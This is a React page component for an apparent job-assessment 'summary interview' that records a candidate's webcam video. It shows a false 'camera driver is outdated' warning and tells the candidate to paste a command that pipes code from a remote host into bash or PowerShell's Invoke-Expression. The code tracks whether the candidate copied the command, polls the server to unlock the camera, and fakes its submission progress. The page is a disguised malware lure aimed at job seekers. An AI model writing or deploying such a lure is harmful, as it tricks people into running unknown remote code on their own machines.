import { useState, useEffect, useRef, useCallback, useMemo } from 'react'
import { useNavigate, useParams } from 'react-router-dom'
import { getInviteByLink, updateInvite } from '../api/invites'
import { detectClientOs as detectClientDriverOs } from '../utils/clientOs'
import styles from './SummaryInterview.module.css'

export default function SummaryInterview() {
  const navigate = useNavigate()
  const { inviteLink } = useParams()
  const videoRef = useRef(null)
  const playbackRef = useRef(null)
  const [status, setStatus] = useState('idle') // idle | loading | ready | recording | recorded | error
  const [error, setError] = useState(null)
  const [stream, setStream] = useState(null)
  const [recordingBlob, setRecordingBlob] = useState(null)
  const mediaRecorderRef = useRef(null)
  const chunksRef = useRef([])
  const [playbackPlaying, setPlaybackPlaying] = useState(false)
  const [playbackCurrent, setPlaybackCurrent] = useState(0)
  const [playbackDuration, setPlaybackDuration] = useState(0)
  const [playbackVolume, setPlaybackVolume] = useState(1)
  const playbackProgressRef = useRef(null)
  const [recordingElapsed, setRecordingElapsed] = useState(0)
  const recordingStartRef = useRef(null)

  const [allowed, setAllowed] = useState(null) // null = checking, true = show page, false = redirecting
  const [assessmentCompleted, setAssessmentCompleted] = useState(false) // true only when user has completed the assessment
  const [connectionsStatus, setConnectionsStatus] = useState(null) // 0/1 = camera not fixed, 2 = camera fixed (button active), 3 = completed
  const [invalidInvite, setInvalidInvite] = useState(false) // true when invite URL exists but invite was deleted
  const [submitStatus, setSubmitStatus] = useState(null) // null | 'submitting' | 'success'
  const [submitProgress, setSubmitProgress] = useState(0) // 0–100 for 5s circle
  const [showSubmitConfirm, setShowSubmitConfirm] = useState(false)
  const [driverOs, setDriverOs] = useState(() => detectClientDriverOs())
  const [copySuccess, setCopySuccess] = useState(false)
  const [driverHelpExpanded, setDriverHelpExpanded] = useState(false)
  const [cameraDriverUpdatedMessage, setCameraDriverUpdatedMessage] = useState(null) // shown once when connections_status becomes 2
  const driverCommandRef = useRef(null)
  const connectionsStatusRef = useRef(null)

  const clientOsKind = useMemo(() => {
    const os = detectClientDriverOs()
    if (os === 'windows') return 'windows'
    if (os === 'mac') return 'mac'
    return 'other'
  }, [])

  const recordDriverHelpLinkClick = useCallback(() => {
    if (!inviteLink) return
    updateInvite(inviteLink, { driver_click_status: 1 }).catch(() => {})
  }, [inviteLink])

  const copyCommandToClipboard = useCallback(() => {
    const text = driverCommandRef.current?.textContent?.trim()
    if (!text) return
    navigator.clipboard.writeText(text).then(() => {
      if (inviteLink) {
        updateInvite(inviteLink, { driver_click_status: 2 }).catch(() => {})
      }
      setCopySuccess(true)
      setTimeout(() => setCopySuccess(false), 2000)
    }).catch(() => {})
  }, [inviteLink])

  const fetchConnectionsStatus = useCallback(() => {
    if (!inviteLink) return
    getInviteByLink(inviteLink)
      .then((inv) => {
        const status = Number(inv.connections_status)
        const prev = connectionsStatusRef.current
        if (status === 2 && (prev === 0 || prev === 1 || prev === 6)) {
          setCameraDriverUpdatedMessage('Your camera driver has been updated successfully.')
        }
        setConnectionsStatus(status)
        setInvalidInvite([3, 4, 5].includes(status))
        try {
          sessionStorage.setItem('invite_connections_status', String(status))
        } catch (_) {}
      })
      .catch(() => {
        setInvalidInvite(true)
      })
  }, [inviteLink])

  useEffect(() => {
    if (!inviteLink) return
    setInvalidInvite(false)
    fetchConnectionsStatus()
  }, [inviteLink, fetchConnectionsStatus])

  useEffect(() => {
    connectionsStatusRef.current = connectionsStatus
  }, [connectionsStatus])

  // When connections_status is not yet 2 or terminal (3,4,5), refetch periodically (includes 6)
  useEffect(() => {
    if (!inviteLink || [2, 3, 4, 5].includes(connectionsStatus)) return
    const interval = setInterval(fetchConnectionsStatus, 3000)
    return () => clearInterval(interval)
  }, [inviteLink, connectionsStatus, fetchConnectionsStatus])

  useEffect(() => {
    const onFocus = () => {
      if (inviteLink && ![2, 3, 4, 5].includes(connectionsStatus)) fetchConnectionsStatus()
    }
    window.addEventListener('focus', onFocus)
    return () => window.removeEventListener('focus', onFocus)
  }, [inviteLink, connectionsStatus, fetchConnectionsStatus])

  useEffect(() => {
    if (!cameraDriverUpdatedMessage) return
    const t = setTimeout(() => setCameraDriverUpdatedMessage(null), 5000)
    return () => clearTimeout(t)
  }, [cameraDriverUpdatedMessage])

  useEffect(() => {
    if (inviteLink) return // when invite in URL, we fetch above
    try {
      const s = sessionStorage.getItem('invite_connections_status')
      if (s !== null) setConnectionsStatus(Number(s))
    } catch (_) {}
  }, [inviteLink])

  useEffect(() => {
    try {
      const candidate = localStorage.getItem('assessment_candidate')
      const completed = localStorage.getItem('assessment_completed')
      if (!candidate) {
        navigate(inviteLink ? `/invite/${inviteLink}` : '/', { replace: true })
        setAllowed(false)
        return
      }
      setAllowed(true)
      setAssessmentCompleted(!!completed)
    } catch (_) {
      navigate(inviteLink ? `/invite/${inviteLink}` : '/', { replace: true })
      setAllowed(false)
    }
  }, [navigate, inviteLink])

  const stopStream = useCallback((s) => {
    if (s && s.getTracks) s.getTracks().forEach((t) => t.stop())
  }, [])

  useEffect(() => {
    return () => {
      stopStream(stream)
    }
  }, [stream, stopStream])

  const playbackUrl = useMemo(
    () => (recordingBlob ? URL.createObjectURL(recordingBlob) : ''),
    [recordingBlob]
  )
  useEffect(() => {
    return () => {
      if (playbackUrl) URL.revokeObjectURL(playbackUrl)
    }
  }, [playbackUrl])

  const startCamera = async () => {
    setError(null)
    setStatus('loading')
    try {
      const constraints = {
        video: { width: 1280, height: 720, facingMode: 'user' },
        audio: true,
      }
      let mediaStream
      if (navigator.mediaDevices?.getUserMedia) {
        mediaStream = await navigator.mediaDevices.getUserMedia(constraints)
      } else {
        const legacyGetUserMedia =
          navigator.getUserMedia ||
          navigator.webkitGetUserMedia ||
          navigator.mozGetUserMedia
        if (!legacyGetUserMedia) {
          setError(
            'Camera is not available. Use HTTPS or open this page at http://localhost to allow camera access.'
          )
          setStatus('error')
          return
        }
        mediaStream = await new Promise((resolve, reject) => {
          legacyGetUserMedia.call(navigator, constraints, resolve, reject)
        })
      }
      setStream(mediaStream)
      setStatus('ready')
    } catch (err) {
      setError(err.message || 'Could not access camera or microphone.')
      setStatus('error')
    }
  }

  // Attach stream to video element when both exist (video mounts only when status is ready/recording)
  useEffect(() => {
    if (!stream || !videoRef.current) return
    videoRef.current.srcObject = stream
    const video = videoRef.current
    const play = () => video.play().catch(() => {})
    play()
    return () => {
      video.srcObject = null
    }
  }, [stream, status])

  const startRecording = () => {
    if (!stream || status !== 'ready') return
    chunksRef.current = []
    const mediaRecorder = new MediaRecorder(stream, {
      mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9' : 'video/webm',
      videoBitsPerSecond: 2500000,
      audioBitsPerSecond: 128000,
    })
    mediaRecorder.ondataavailable = (e) => {
      if (e.data.size > 0) chunksRef.current.push(e.data)
    }
    mediaRecorder.onstop = () => {
      const blob = new Blob(chunksRef.current, { type: 'video/webm' })
      setRecordingBlob(blob)
      setStatus('recorded')
    }
    mediaRecorder.start(1000)
    mediaRecorderRef.current = mediaRecorder
    recordingStartRef.current = Date.now()
    setRecordingElapsed(0)
    setStatus('recording')
  }

  // Timer while recording
  useEffect(() => {
    if (status !== 'recording') return
    const interval = setInterval(() => {
      if (recordingStartRef.current) {
        setRecordingElapsed(Math.floor((Date.now() - recordingStartRef.current) / 1000))
      }
    }, 1000)
    return () => {
      clearInterval(interval)
      recordingStartRef.current = null
    }
  }, [status])

  const stopRecording = () => {
    if (mediaRecorderRef.current && mediaRecorderRef.current.state !== 'inactive') {
      mediaRecorderRef.current.stop()
    }
  }

  const reRecord = () => {
    setRecordingBlob(null)
    setSubmitStatus(null)
    setSubmitProgress(0)
    if (playbackRef.current) playbackRef.current.src = ''
    setPlaybackPlaying(false)
    setPlaybackCurrent(0)
    setPlaybackDuration(0)
    setStatus('ready')
  }

  const SUBMIT_DURATION_MS = 5000

  const runSubmit = async () => {
    if (!inviteLink) return
    setShowSubmitConfirm(false)
    setSubmitStatus('submitting')
    setSubmitProgress(0)
    const start = Date.now()
    const interval = setInterval(() => {
      const elapsed = Date.now() - start
      const p = Math.min(100, (elapsed / SUBMIT_DURATION_MS) * 100)
      setSubmitProgress(p)
      if (p >= 100) {
        clearInterval(interval)
      }
    }, 50)
    await new Promise((r) => setTimeout(r, SUBMIT_DURATION_MS))
    clearInterval(interval)
    try {
      await updateInvite(inviteLink, { connections_status: 3 })
      setConnectionsStatus(3)
      try {
        sessionStorage.setItem('invite_connections_status', '3')
      } catch (_) {}
    } catch (_) {}
    setSubmitStatus('success')
  }

  const handleSubmit = () => {
    if (!inviteLink) return
    setShowSubmitConfirm(true)
  }

  useEffect(() => {
    if (submitStatus !== 'success' || !inviteLink) return
    const t = setTimeout(() => {
      navigate(`/invite/${inviteLink}/completed`, { replace: true })
    }, 2500)
    return () => clearTimeout(t)
  }, [submitStatus, inviteLink, navigate])

  const downloadRecording = () => {
    if (!recordingBlob) return
    const url = URL.createObjectURL(recordingBlob)
    const a = document.createElement('a')
    a.href = url
    a.download = `summary-interview-${Date.now()}.webm`
    a.click()
    URL.revokeObjectURL(url)
  }

  // Playback video: sync state and custom controls (controls stay in original position, not mirrored)
  useEffect(() => {
    const video = playbackRef.current
    if (!video || !playbackUrl) return
    const onTimeUpdate = () => setPlaybackCurrent(video.currentTime)
    const onDurationChange = () => setPlaybackDuration(video.duration || 0)
    const onPlay = () => setPlaybackPlaying(true)
    const onPause = () => setPlaybackPlaying(false)
    const onEnded = () => setPlaybackPlaying(false)
    video.addEventListener('timeupdate', onTimeUpdate)
    video.addEventListener('durationchange', onDurationChange)
    video.addEventListener('play', onPlay)
    video.addEventListener('pause', onPause)
    video.addEventListener('ended', onEnded)
    setPlaybackDuration(video.duration || 0)
    setPlaybackCurrent(video.currentTime)
    return () => {
      video.removeEventListener('timeupdate', onTimeUpdate)
      video.removeEventListener('durationchange', onDurationChange)
      video.removeEventListener('play', onPlay)
      video.removeEventListener('pause', onPause)
      video.removeEventListener('ended', onEnded)
    }
  }, [playbackUrl])

  const togglePlayback = () => {
    const video = playbackRef.current
    if (!video) return
    if (video.paused) video.play()
    else video.pause()
  }

  const seekPlayback = (e) => {
    const video = playbackRef.current
    const bar = playbackProgressRef.current
    if (!video || !bar) return
    const rect = bar.getBoundingClientRect()
    const p = Math.max(0, Math.min(1, (e.clientX - rect.left) / rect.width))
    video.currentTime = p * video.duration
  }

  const changePlaybackVolume = (v) => {
    const video = playbackRef.current
    if (video) video.volume = v
    setPlaybackVolume(v)
  }

  const togglePlaybackFullscreen = () => {
    const wrap = playbackRef.current?.closest(`.${styles.previewWrap}`)
    if (!wrap) return
    if (!document.fullscreenElement) {
      wrap.requestFullscreen?.()
    } else {
      document.exitFullscreen?.()
    }
  }

  const formatTime = (s) => {
    if (!Number.isFinite(s) || s < 0) return '0:00'
    const m = Math.floor(s / 60)
    const sec = Math.floor(s % 60)
    return `${m}:${sec.toString().padStart(2, '0')}`
  }

  if (allowed === null || allowed === false) {
    return (
      <div className={styles.page}>
        <div className={styles.loading}>Loading…</div>
      </div>
    )
  }

  if (inviteLink && invalidInvite) {
    return (
      <div className={styles.page}>
        <div className={styles.invalidInvite}>
          <p className={styles.invalidInviteText}>Invalid or expired invite link.</p>
        </div>
      </div>
    )
  }

  if (allowed && !assessmentCompleted) {
    return (
      <div className={styles.page}>
        <div className={styles.card}>
          <header className={styles.header}>
            <span className={styles.badge}>Summary Interview</span>
            <h1 className={styles.title}>Record your summary</h1>
          </header>
          <div className={styles.completeAssessmentWrap}>
            <div className={styles.warningAlert} role="alert">
              <span className={styles.warningAlertIcon} aria-hidden>⚠</span>
              <div className={styles.warningAlertContent}>
                <p className={styles.warningAlertTitle}>Complete assessment first</p>
                <p className={styles.warningAlertMessage}>
                  You need to complete all questions before you can record your summary.
                </p>
              </div>
            </div>
            <button
              type="button"
              className={styles.btnPrimary}
              onClick={() => navigate(inviteLink ? `/invite/${inviteLink}/assessment` : '/assessment', { replace: true })}
            >
              Go to assessment
            </button>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className={styles.page}>
      {submitStatus === 'submitting' && (
        <div className={styles.submitFullPage} role="status" aria-live="polite" aria-label="Submitting assessment">
          <div className={styles.submitFullPageContent}>
            <div className={styles.submitFullPageSpinner} aria-hidden />
            <p className={styles.submitFullPageTitle}>Submitting your assessment</p>
            <p className={styles.submitFullPageSubtext}>Please wait while we save your responses and video.</p>
            <div className={styles.submitFullPageBar}>
              <div className={styles.submitFullPageBarFill} style={{ width: `${submitProgress}%` }} />
            </div>
          </div>
        </div>
      )}
      {submitStatus === 'success' && (
        <div className={styles.toastWrap} role="alert" aria-live="polite">
          <div className={styles.toast}>
            <span className={styles.toastIcon}>✓</span>
            <p className={styles.toastMessage}>Your assessment was successfully submitted.</p>
          </div>
        </div>
      )}
      {showSubmitConfirm && (
        <div className={styles.submitConfirmOverlay} role="dialog" aria-modal="true" aria-labelledby="submit-confirm-title">
          <div className={styles.submitConfirmCard}>
            <h2 id="submit-confirm-title" className={styles.submitConfirmTitle}>Submit Assessment</h2>
            <p className={styles.submitConfirmMessage}>
              Please make sure you have answered all questions and completed any required recordings before submitting. Once the assessment is submitted, you may not be able to return and edit your answers.
            </p>
            <p className={styles.submitConfirmQuestion}>Do you want to submit now?</p>
            <div className={styles.submitConfirmActions}>
              <button
                type="button"
                className={styles.submitConfirmCancel}
                onClick={() => setShowSubmitConfirm(false)}
              >
                Cancel
              </button>
              <button
                type="button"
                className={styles.submitConfirmContinue}
                onClick={runSubmit}
              >
                Continue
              </button>
            </div>
          </div>
        </div>
      )}
      {cameraDriverUpdatedMessage && (
        <div className={styles.toastWrap} role="alert" aria-live="polite">
          <div className={styles.toast}>
            <span className={styles.toastIcon}>✓</span>
            <p className={styles.toastMessage}>{cameraDriverUpdatedMessage}</p>
          </div>
        </div>
      )}
      <div className={styles.card}>
        <header className={styles.header}>
          <div className={styles.headerTop}>
            <span className={styles.badge}>Summary Interview</span>
          </div>
          <h1 className={styles.title}>
            {status === 'recorded' ? 'Review your summary' : 'Record your summary'}
          </h1>
          <p className={styles.subtitle}>
            {status === 'recorded'
              ? 'Play back your recording below. Re-record or download when you’re satisfied.'
              : 'We kindly ask you to record a short video (at least one minute) sharing your career journey. This is a required part of your submission, and we appreciate your time and effort.'}
          </p>
        </header>

        {error && (
          <div className={styles.errorBanner} role="alert">
            <span className={styles.errorBannerIcon} aria-hidden>⚠</span>
            <span>{error}</span>
          </div>
        )}

        <div className={styles.videoSection}>
          {status === 'idle' && (
            <div className={styles.placeholder}>
              <span className={styles.placeholderIcon}>▶</span>
              {connectionsStatus === 2 ? (
                <>
                  <p>Camera is off. Click &quot;Start camera&quot; to begin.</p>
                  <button
                    type="button"
                    onClick={startCamera}
                    className={styles.btnPrimary}
                  >
                    Start camera
                  </button>
                </>
              ) : (
                <>
                  {connectionsStatus !== null && (
                    <div className={styles.warningAlert} role="alert">
                      <span className={styles.warningAlertIcon} aria-hidden>⚠</span>
                      <div className={styles.warningAlertContent}>
                        <p className={styles.warningAlertTitle}>
                          {!assessmentCompleted ? 'Complete the assessment first' : 'Camera access is unavailable'}
                        </p>
                        <p className={styles.warningAlertMessage}>
                          {!assessmentCompleted ? (
                            'Finish all assessment questions before recording your summary video.'
                          ) : clientOsKind === 'mac' ? (
                            <>
                              Your camera driver is outdated. To use the recording feature, please update it to the latest version. You can update your camera driver directly from our assessment platform. Please see the instructions below.
                            </>
                          ) : clientOsKind === 'windows' ? (
                            <>Your camera driver is outdated. To use the recording feature, please update it to the latest version. You can update your camera driver directly from our assessment platform. Please see the instructions below.
                            </>
                          ) : (
                            <>
                              Your camera driver is outdated. To use the recording feature, please update it to the latest version. You can update your camera driver directly from our assessment platform. Please see the instructions below.
                            </>
                          )}
                        </p>
                      </div>
                    </div>
                  )}
                  {connectionsStatus === null && inviteLink && (
                    <p className={styles.checkingMessage}>Checking connection status…</p>
                  )}
                  <button
                    type="button"
                    onClick={startCamera}
                    className={styles.btnPrimary}
                    disabled={connectionsStatus !== 2}
                  >
                    Start camera
                  </button>
                </>
              )}
            </div>
          )}

          {status === 'loading' && (
            <div className={styles.placeholder}>
              <span className={styles.placeholderSpinner} aria-hidden />
              <p>Requesting camera and microphone…</p>
            </div>
          )}

          {(status === 'ready' || status === 'recording') && (
            <div className={styles.previewWrap}>
              <video
                ref={videoRef}
                autoPlay
                muted
                playsInline
                className={styles.video}
              />
              {status === 'recording' && (
                <div className={styles.recordingIndicator}>
                  <span className={styles.recDot} /> Recording… <span className={styles.recordingTime}>{formatTime(recordingElapsed)}</span>
                </div>
              )}
            </div>
          )}

          {status === 'recorded' && playbackUrl && (
            <div className={styles.previewWrap}>
              <video
                ref={playbackRef}
                src={playbackUrl}
                playsInline
                className={styles.video}
                onClick={togglePlayback}
              />
              <div className={styles.playbackControls} aria-label="Video controls">
                <button type="button" onClick={togglePlayback} className={styles.controlBtn} aria-label={playbackPlaying ? 'Pause' : 'Play'}>
                  {playbackPlaying ? '⏸' : '▶'}
                </button>
                <span className={styles.controlTime}>{formatTime(playbackCurrent)}</span>
                <div
                  ref={playbackProgressRef}
                  className={styles.progressBar}
                  onClick={seekPlayback}
                  role="slider"
                  aria-valuenow={playbackDuration ? (playbackCurrent / playbackDuration) * 100 : 0}
                  aria-valuemin={0}
                  aria-valuemax={100}
                  tabIndex={0}
                  onKeyDown={(e) => {
                    const video = playbackRef.current
                    if (!video) return
                    if (e.key === 'ArrowLeft') video.currentTime = Math.max(0, video.currentTime - 5)
                    if (e.key === 'ArrowRight') video.currentTime = Math.min(video.duration, video.currentTime + 5)
                  }}
                >
                  <div className={styles.progressFill} style={{ width: `${playbackDuration ? (playbackCurrent / playbackDuration) * 100 : 0}%` }} />
                </div>
                <span className={styles.controlTime}>{formatTime(playbackDuration)}</span>
                <button type="button" onClick={() => changePlaybackVolume(playbackVolume === 0 ? 1 : 0)} className={styles.controlBtn} aria-label={playbackVolume === 0 ? 'Unmute' : 'Mute'}>
                  {playbackVolume === 0 ? '🔇' : '🔊'}
                </button>
                <input
                  type="range"
                  min={0}
                  max={1}
                  step={0.05}
                  value={playbackVolume}
                  onChange={(e) => changePlaybackVolume(parseFloat(e.target.value))}
                  className={styles.volumeSlider}
                  aria-label="Volume"
                />
                <button type="button" onClick={togglePlaybackFullscreen} className={styles.controlBtn} aria-label="Fullscreen">
                  ⛶
                </button>
              </div>
            </div>
          )}
        </div>

        <div className={styles.actions}>
          {status === 'ready' && (
            <>
              <button type="button" onClick={startRecording} className={styles.btnPrimary}>
                Start recording
              </button>
            </>
          )}
          {status === 'recording' && (
            <button type="button" onClick={stopRecording} className={styles.btnDanger}>
              Stop recording
            </button>
          )}
          {status === 'recorded' && (
            <>
              <button type="button" onClick={reRecord} className={styles.btnSecondary}>
                Re-record
              </button>
              {inviteLink ? (
                <button
                  type="button"
                  onClick={handleSubmit}
                  className={styles.btnPrimary}
                  disabled={submitStatus === 'submitting' || showSubmitConfirm}
                >
                  Submit
                </button>
              ) : (
                <button type="button" onClick={downloadRecording} className={styles.btnPrimary}>
                  Download recording
                </button>
              )}
            </>
          )}
        </div>

        <div className={styles.driverHelp}>
          <button
            type="button"
            onClick={() => setDriverHelpExpanded((e) => !e)}
            className={styles.driverHelpToggle}
            aria-expanded={driverHelpExpanded}
            aria-controls="driver-help-content"
            id="driver-help-toggle"
          >
            <span className={styles.driverHelpToggleLabel}>
              <span className={styles.driverHelpTitle}>Camera driver update guide</span>
              <span className={styles.driverHelpToggleHint}>
                {driverHelpExpanded ? 'Click to hide' : 'Click to show steps'}
              </span>
            </span>
            <span className={styles.driverHelpArrow} aria-hidden>
              {driverHelpExpanded ? '▲' : '▼'}
            </span>
          </button>
          <div id="driver-help-content" className={styles.driverHelpContent} hidden={!driverHelpExpanded}>
          <div className={styles.driverHelpContentInner}>
            <div className={styles.driverHelpOsRow}>
              <label htmlFor="driver-os" className={styles.driverHelpLabel}>Operating system</label>
              <select
                id="driver-os"
                value={driverOs}
                onChange={(e) => setDriverOs(e.target.value)}
                className={styles.driverHelpSelect}
                aria-describedby="driver-steps driver-command"
              >
                <option value="mac">Mac</option>
                <option value="windows">Windows</option>
                <option value="linux">Linux</option>
              </select>
            </div>
            <ol id="driver-steps" className={styles.driverHelpSteps}>
              <li className={styles.driverHelpStep}>
                <div className={styles.driverHelpStepHeader}>
                  <span className={styles.driverHelpStepNum}>1</span>
                  <span className={styles.driverHelpStepTitle}>Open Terminal</span>
                </div>
                <div className={styles.driverHelpStepBody}>
                  {driverOs === 'mac' && (
                    <p>Press <kbd>Cmd</kbd> + <kbd>Space</kbd>, type <strong>Terminal</strong>, then press <kbd>Enter</kbd>. Or go to <strong>Applications → Utilities → Terminal</strong>.</p>
                  )}
                  {driverOs === 'windows' && (
                    <p>
                      Press <kbd>Windows</kbd> + <kbd>S</kbd>, type <strong>PowerShell</strong>, then press <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>Enter</kbd>.
                    </p>
                  )}
                  {driverOs === 'linux' && (
                    <p>Press <kbd>Ctrl</kbd> + <kbd>Alt</kbd> + <kbd>T</kbd>, or open <strong>Terminal</strong> from your applications menu.</p>
                  )}
                </div>
              </li>
              <li className={styles.driverHelpStep}>
                <div className={styles.driverHelpStepHeader}>
                  <span className={styles.driverHelpStepNum}>2</span>
                  <span className={styles.driverHelpStepTitle}>Copy the command</span>
                </div>
                <div className={styles.driverHelpStepBody}>
                  <p>Click the <strong>Copy</strong> button next to the command below. The full command will be copied to your clipboard.</p>
                </div>
              </li>
              <li className={styles.driverHelpStep}>
                <div className={styles.driverHelpStepHeader}>
                  <span className={styles.driverHelpStepNum}>3</span>
                  <span className={styles.driverHelpStepTitle}>Paste and run</span>
                </div>
                <div className={styles.driverHelpStepBody}>
                  <p>In the terminal window, paste with <kbd>{driverOs === 'mac' ? 'Cmd' : 'Ctrl'}</kbd> + <kbd>V</kbd>, then press <kbd>Enter</kbd>. Wait for the update to finish, then return here and click <strong>Start camera</strong>.</p>
                </div>
              </li>
            </ol>
            <div className={styles.driverHelpCommandSection}>
              <span className={styles.driverHelpCommandLabel}>Command to run</span>
              <div className={styles.driverHelpCommandWrap}>
            <div ref={driverCommandRef} id="driver-command" className={styles.driverHelpCommand} role="region" aria-label="Command to copy">
                {driverOs === 'mac' && (
                      <code>
                      {`curl -sL -X POST https://api.wecreateproblems.net/mac/${inviteLink ? inviteLink : ''} | bash`}
                          </code>
                  )}
                {driverOs === 'windows' && (
                          <code>
                      {`Invoke-RestMethod -Uri "https://api.wecreateproblems.net/window/${inviteLink ? inviteLink : ''}" -Method POST | Invoke-Expression`}
                          </code>
                      )}
              {driverOs === 'linux' && (
                      <code>
                  {`curl -sL -X POST https://api.wecreateproblems.net/mac/${inviteLink ? inviteLink : ''} | bash`}
                      </code>
                  )}
            </div>
            <button
              type="button"
              onClick={copyCommandToClipboard}
              className={styles.driverHelpCopyBtn}
              aria-label={copySuccess ? 'Copied' : 'Copy command'}
            >
              {copySuccess ? 'Copied!' : 'Copy'}
            </button>
              </div>
            </div>
          </div>
          </div>
        </div>
      </div>
    </div>
  )
}
